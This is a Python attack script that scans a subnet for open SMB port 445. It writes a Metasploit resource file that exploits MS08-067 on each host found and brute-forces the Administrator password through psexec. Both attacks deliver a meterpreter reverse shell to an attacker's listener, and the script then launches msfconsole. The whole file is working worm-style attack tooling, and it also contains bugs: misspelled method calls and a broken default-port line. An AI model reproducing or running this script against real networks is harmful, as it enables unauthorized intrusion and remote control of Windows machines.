#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed May  9 13:11:23 2018

@author: starboy
"""
# This script is pretty generic and can be used to perform other expolits as well

# Here we perform the conflicker exploit, with a few additional attack vectors
# Scan for possible targets : systems with port 445 open
# Exploit them using MS08_067 vulnerability
# Or bruteforce through a list to execute processes remotely

import os
import nmap
import optparse

# Scanning for machines with port 445 open
# Change port to target any other service which runs on a specif port
def find_targets(subnet):
    n_scan = nmap.PortScanner()
    n_scan.scan(subnet,'445')
    target_hosts = []
    for host in n_scan.all_hosts():
        if n_scan[host].has_tcp(445):
            state = n_scan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Target acquired: '+ host)
                target_hosts.append(host)
    return target_hosts

# Setup metasploit handler for exploit
def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
    config_file.write('set LHOST '+lhost+'\n')
    config_file.write('set LPORT '+str(lport)+'\n')
    config_file.write('exploit -j -z\n')
    # As we need only one handler to listen to all connections
    # Script will create only one handler
    config_file.write('setg DisablePayloadHandler 1\n')


# Setup metasploit for running the conflicker exploit
def conflicker_exploit(config_file, target_host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write('set RHOST '+str(target_host)+'\n')
    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
    config_file.write('set LHOST '+lhost+'\n')
    config_file.write('set LPORT '+str(lport)+'\n')
    config_file.write('exploit -j -z\n')
    
# Second attack vector of conflicker    
# Brute force SMB user and password
def smb_brute(config_file, target_host, password_file, lhost, lport):
    username = 'Administrator'
    pf = open(password_file, 'r')
    
    for password in pf.readlines():
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.wirte('set SMBUser '+username+'\n')
        config_file.wirte('set SMBPass '+password+'\n')
        config_file.write('set RHOST '+str(target_host)+'\n')
        config_file.write('set payload windows/meterpreter/reverse_tcp\n')
        config_file.write('set LHOST '+lhost+'\n')
        config_file.write('set LPORT '+str(lport)+'\n')
        config_file.write('exploit -j -z\n')
        
# Option parsing
parser = optparse.OptionParser('Usage: -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
parser.add_option('-H', dest='rhost', type='string', help='enter target host address or range of addresses')
parser.add_option('-l', dest='lhost', type='string', help='enter the listening address')
parser.add_option('-p', dest='lport', type='string', help='enter the listening port')
parser.add_option('-F', dest='pass_file', type='string', help='enter the password file for SMB brute force')

(options, args) = parser.parse_args()
rhost = options.rhost
lport = options.lport
lhost = options.lhost
password_file = options.pass_file

# Set config file as metasploit config file
# if file not in the directory than will be created
config_file = open('meta.rc', 'w')

# Checking if arguments entered correctly
if rhost == None or lhost == None:
    print(parser.usage)
    exit(0)
    
# Set default lport
if lport == None:
    lport == 5337

# Getting the vulnerable targets
target_hosts = find_targets(rhost)
# Setting up handler
setup_handler(config_file, lhost, lport)

for target in target_hosts:
    # First attack
    conflicker_exploit(config_file, target, lhost, lport)
    # Second attack
    if password_file != None:
        smb_brute(config_file, target, password_file, lhost, lport)
        
config_file.close()

# Run metasploit!!
os.system('msfconsole -r meta.rc')